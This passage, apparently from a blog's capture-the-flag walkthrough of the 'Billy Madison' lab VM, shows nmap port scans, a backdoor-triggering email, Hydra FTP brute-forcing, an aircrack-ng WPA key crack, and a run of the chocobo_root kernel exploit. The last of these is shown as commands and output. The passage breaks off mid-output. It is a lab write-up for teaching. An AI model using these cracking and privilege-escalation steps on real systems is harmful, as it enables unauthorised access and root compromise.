+&lt;/span&gt;Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
+Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00058s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+PORT     STATE    SERVICE
+1466/tcp filtered oceansoft-lm
+MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.45 seconds
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
+Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00048s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+PORT   STATE    SERVICE
+67/tcp filtered dhcps
+MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.28 seconds
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
+Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00031s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+PORT     STATE    SERVICE
+1469/tcp filtered aal-lm
+MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.28 seconds
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
+Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00047s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+PORT     STATE    SERVICE
+1514/tcp filtered unknown
+MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.42 seconds
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
+Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00074s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+PORT     STATE    SERVICE
+1981/tcp filtered p2pq
+MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.27 seconds
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
+Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00060s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+PORT     STATE    SERVICE
+1986/tcp filtered licensedaemon
+MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.27 seconds
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
+Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00039s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+PORT     STATE    SERVICE
+1588/tcp filtered unknown
+MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.27 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now let's connect to &lt;b&gt;ftp&lt;/b&gt;, will this work?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ftp 10.0.2.4
+Connected to 10.0.2.4.
+220 Welcome to ColoradoFTP - the open &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;FTP server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www.coldcore.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.0.2.4:root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: eric
+331 User name okay, need password.
+Password:
+230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;, proceed.
+Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
+&lt;span class=&quot;gp&quot;&gt;ftp&amp;gt; &lt;/span&gt;ls
+200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
+150 Opening A mode data connection &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; /.
+-rwxrwxrwx 1 ftp 5367 Aug 20 12:49 39772
+-rwxrwxrwx 1 ftp 1287 Aug 20 12:49 9129
+-rwxrwxrwx 1 ftp 868 Sep 01 10:42 .notes
+-rwxrwxrwx 1 ftp 6326 Aug 20 12:49 40049
+-rwxrwxrwx 1 ftp 9132 Aug 20 12:49 40054
+-rwxrwxrwx 1 ftp 5208 Aug 20 12:49 39773
+226 Transfer completed.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, we have access! I logged using previously known eric password credentials. We have some interesting files, but in the beginning, let's view &lt;b&gt;.notes&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;cat .notes
+Ugh, this is frustrating.  
+
+I managed to make a system account &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;myself. I also managed to hide Billy&lt;span class=&quot;s1&quot;&gt;'s paper
+where he'&lt;/span&gt;ll never find it.  However, now I can&lt;span class=&quot;s1&quot;&gt;'t find it either :-(.
+To make matters worse, my privesc exploits aren'&lt;/span&gt;t working.  
+One sort of worked, but I think I have it installed all backwards.
+
+If I&lt;span class=&quot;s1&quot;&gt;'m going to maintain total control of Billy'&lt;/span&gt;s miserable life &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;or what&lt;span class=&quot;s1&quot;&gt;'s left of it)
+I need to root the box and find that paper!
+
+Fortunately, my SSH backdoor into the system IS working.  
+All I need to do is send an email that includes
+the text: &quot;My kid will be a ________ _________&quot;
+
+Hint: https://www.youtube.com/watch?v=6u7RsW5SAgs
+
+The new secret port will be open and then I can login from there with my wifi password, which I'&lt;/span&gt;m
+sure Billy or Veronica know.  I didn&lt;span class=&quot;s1&quot;&gt;'t see it in Billy'&lt;/span&gt;s FTP folders, but didn&lt;span class=&quot;s1&quot;&gt;'t have time to
+check Veronica'&lt;/span&gt;s.
+
+-EG&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2&gt;Backdoor&lt;/h2&gt;
+
+&lt;p&gt;Another cryptic riddle? This time it was a lot easier, since we can hear phrase &lt;b&gt;My kid will be a soccer player&lt;/b&gt; in the video. We can now send an email using &lt;b&gt;swaks&lt;/b&gt;. But to which port? &lt;/p&gt;
+
+&lt;p&gt;By looking once again at .cap file we can see this line: &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Transmission Control Protocol, Src Port: 42278 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42278&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Dst Port: 2525 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2525&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Seq: 12, Ack: 78, Len: 36&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Destination port &lt;b&gt;2525&lt;/b&gt;. Let's construct this email! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;swaks --to eric@madisonhotels.com --from vvaughn@polyfector.edu --server 10.0.2.4:2525 --body &lt;span class=&quot;s2&quot;&gt;&quot;My kid will be a soccer player&quot;&lt;/span&gt; --header &lt;span class=&quot;s2&quot;&gt;&quot;Subject: My kid will be a soccer player&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; Trying 10.0.2.4:2525...
+&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; Connected to 10.0.2.4.
+&amp;lt;-  220 BM ESMTP SubEthaSMTP null
+ -&amp;gt; EHLO kali
+&amp;lt;-  250-BM
+&amp;lt;-  250-8BITMIME
+&amp;lt;-  250-AUTH LOGIN
+&amp;lt;-  250 Ok
+ -&amp;gt; MAIL FROM:&amp;lt;vvaughn@polyfector.edu&amp;gt;
+&amp;lt;-  250 Ok
+ -&amp;gt; RCPT TO:&amp;lt;eric@madisonhotels.com&amp;gt;
+&amp;lt;-  250 Ok
+ -&amp;gt; DATA
+&amp;lt;-  354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
+ -&amp;gt; Date: Mon, 13 Mar 2017 15:08:57 -0400
+ -&amp;gt; To: eric@madisonhotels.com
+ -&amp;gt; From: vvaughn@polyfector.edu
+ -&amp;gt; Subject: My kid will be a soccer player
+ -&amp;gt; X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
+ -&amp;gt;
+ -&amp;gt; My kid will be a soccer player
+ -&amp;gt;
+ -&amp;gt; .
+&amp;lt;-  250 Ok
+ -&amp;gt; QUIT
+&amp;lt;-  221 Bye
+&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; Connection closed with remote host.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2&gt;SSH&lt;/h2&gt;
+
+&lt;p&gt;Hmmm, something happened for certain. But what? I run another &lt;b&gt;Nmap&lt;/b&gt; scan, and see that there is new port open at &lt;b&gt;1974&lt;/b&gt; - running &lt;b&gt;ssh&lt;/b&gt; service. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;PORT     STATE  SERVICE
+22/tcp   open   ssh
+23/tcp   open   telnet
+69/tcp   open   tftp
+80/tcp   open   http
+137/tcp  closed netbios-ns
+138/tcp  closed netbios-dgm
+139/tcp  open   netbios-ssn
+445/tcp  open   microsoft-ds
+1974/tcp open   drp
+2525/tcp open   ms-v-worlds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Reading back through the hints, we can see that there should be account named &lt;b&gt;Veronica&lt;/b&gt; in ftp. We can crack the password using &lt;b&gt;Hydra&lt;/b&gt; and previously created wordlist.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;hydra -t 10 -l veronica -P veronica.txt 10.0.2.4 ftp
+Hydra v8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2014 by van Hauser/THC - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes.
+
+Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2017-03-13 15:18:59
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 10 tasks per 1 server, overall 64 tasks, 773 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:773&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~1 try per task
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking service ftp on port 21
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21][ftp] host: 10.0.2.4   login: veronica   password: babygirl_veronica07@yahoo.com
+1 of 1 target successfully completed, 1 valid password found
+Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; finished at 2017-03-13 15:19:15&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, we have the password! Now let's log in to ftp, maybe we'll find something useful?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;cat email-from-billy.eml
+        Sat, 20 Aug 2016 12:55:45 -0500 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CDT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Date: Sat, 20 Aug 2016 12:55:40 -0500
+To: vvaughn@polyfector.edu
+From: billy@madisonhotels.com
+Subject: &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;Sat, 20 Aug 2016 12:55:40 -0500
+X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
+Eric&lt;span class=&quot;s1&quot;&gt;'s wifi
+
+Hey VV,
+
+It'&lt;/span&gt;s your boy Billy here.  Sorry to leave &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the middle of the night but I wanted to crack Eric&lt;span class=&quot;s1&quot;&gt;'s wireless and then mess with him.
+I wasn'&lt;/span&gt;t completely successful yet, but at least I got a start.
+
+I didn&lt;span class=&quot;s1&quot;&gt;'t walk away without doing my signature move, though.  I left a flaming bag of dog poo on his doorstep. :-)
+
+Kisses,
+
+Billy&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we have to crack another password, this time using &lt;b&gt;aircrack-ng&lt;/b&gt; tool. I was running some problems, because aircrack could not recognize &lt;b&gt;.cap&lt;/b&gt; file but after a little bit of googling I've found that it was due to downloading files in &lt;b&gt;ASCII&lt;/b&gt; mode, not in &lt;b&gt;BINARY&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;00:27:47] 1699628 keys tested &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;765.84 k/s&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+
+
+        KEY FOUND! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; triscuit&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+
+
+Master Key     : 9E 8B 4F E6 CC 5E E2 4C 46 84 D2 AF 59 4B 21 6D
+    B5 3B 52 84 04 9D D8 D8 83 67 AF 43 DC 60 CE 92
+
+Transient Key  : 7A FA 82 59 5A 9A 23 6E 8C FB 1D 4B 4D 47 BE 13
+    D7 AC AC 4C 81 0F B5 A2 EE 2D 9F CC 8F 05 D2 82
+    BF F4 4E AE 4E C9 ED EA 31 37 1E E7 29 10 13 92
+    BB 87 8A AE 70 95 F8 62 20 B5 2B 53 8D 0C 5C DC
+
+EAPOL HMAC     : 86 63 53 4B 77 52 82 0C 73 4A FA CA 19 79 05 33
+root@kali:~/Documents#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now it's working. We also have a password, with which we can log to the &lt;b&gt;ssh&lt;/b&gt; service. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ssh -p 1974 eric@10.0.2.4
+eric@10.0.2.4&lt;span class=&quot;s1&quot;&gt;'s password:
+Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-66-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+110 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat Aug 20 22:28:28 2016 from 192.168.3.101
+eric@BM:~$ ls -la
+total 532
+drwxr-xr-x 3 eric eric   4096 Aug 23  2016 .
+drwxr-xr-x 6 root root   4096 Aug 20  2016 ..
+-rw-r--r-- 1 eric eric    220 Aug 20  2016 .bash_logout
+-rw-r--r-- 1 eric eric   3771 Aug 20  2016 .bashrc
+drwx------ 2 eric eric   4096 Aug 20  2016 .cache
+-rw-r--r-- 1 root root 451085 Aug  7  2016 eric-tongue-animated.gif
+-rw-r--r-- 1 root root  60710 Aug  7  2016 eric-unimpressed.jpg
+-rw-r--r-- 1 eric eric    655 Aug 20  2016 .profile
+-rw-r--r-- 1 root root    115 Aug 20  2016 why-1974.txt
+eric@BM:~$ cat why-1974.txt
+Why 1974?  Because: http://www.metacafe.com/watch/an-VB9KuJtnh4bn/billy_madison_1995_billy_hangs_out_with_friends/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2&gt;Privilage Escalation&lt;/h2&gt;
+
+&lt;p&gt;Some pictures but nothing else... To elevate privilages I decided to give a try this &lt;a href=&quot;https://www.exploit-db.com/exploits/40871/&quot;&gt;&lt;b&gt;Choco Root&lt;/b&gt;&lt;/a&gt; exploit, created for &lt;b&gt;Linux Kernel 4.4.0&lt;/b&gt;. It's using &lt;b&gt;race condition&lt;/b&gt; privilage escalation, which I'm going to discuss in one of my future posts. Now let's run it! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;eric@BM:~$ &lt;/span&gt;touch chocobo_root.c
+&lt;span class=&quot;gp&quot;&gt;eric@BM:~$ &lt;/span&gt;nano chocobo_root.c
+&lt;span class=&quot;gp&quot;&gt;eric@BM:~$ &lt;/span&gt;gcc chocobo_root.c -o chocobo_root -lpthread
+&lt;span class=&quot;gp&quot;&gt;eric@BM:~$ &lt;/span&gt;./chocobo_root
+linux AF_PACKET race condition exploit by rebel
+kernel version: 4.4.0-36-generic &lt;span class=&quot;c&quot;&gt;#55&lt;/span&gt;
+proc_dostring &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffffffff81087ea0
+modprobe_path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffffffff81e48f80
+register_sysctl_table &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffffffff81286e50
+set_memory_rw &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xffffffff8106f360
+exploit starting
+making vsyscall page writable..
+
+new exploit attempt starting, jumping to 0xffffffff8106f360, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600000
+sockets allocated
+removing barrier and spraying..
+version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 81561, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 48
+race not won
+
+retrying stage..
+new exploit attempt starting, jumping to 0xffffffff8106f360, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600000
+sockets allocated
+removing barrier and spraying..
+version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 163931, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 48
+race not won
+
+retrying stage..
+new exploit attempt starting, jumping to 0xffffffff8106f360, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600000
+sockets allocated
+removing barrier and spraying..
+version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 221473, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 48
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TPACKET_V1 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; offset_to_first_pkt !&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0, race won &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+please &lt;span class=&quot;nb&quot;&gt;wait &lt;/span&gt;up to a few minutes &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;timer to be executed. &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you ctrl-c now the kernel will hang. so dont &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;that.
+closing socket and verifying.......
+vsyscall page altered!
+
+
+stage 1 completed
+registering new sysctl..
+
+new exploit attempt starting, jumping to 0xffffffff81286e50, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600850
+sockets allocated
+removing barrier and spraying..
+version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 66563, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+race not won
+
+retrying stage..
+new exploit attempt starting, jumping to 0xffffffff81286e50, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600850
+sockets allocated
+removing barrier and spraying..
+version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 143274, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
